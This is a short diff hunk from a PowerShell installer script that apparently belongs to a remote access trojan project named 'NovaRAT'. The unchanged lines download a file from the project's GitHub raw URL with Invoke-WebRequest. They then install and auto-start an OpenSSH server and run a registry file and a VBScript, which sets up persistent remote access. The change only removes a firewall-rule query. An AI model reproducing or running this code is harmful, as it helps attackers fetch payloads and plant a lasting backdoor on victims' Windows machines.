@@ -54,8 +54,6 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/file
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
-Get-NetFirewallRule -Name *ssh*
-
 
 #install the registry
 ./"$reg_file.reg";"$vbs_file.vbs"
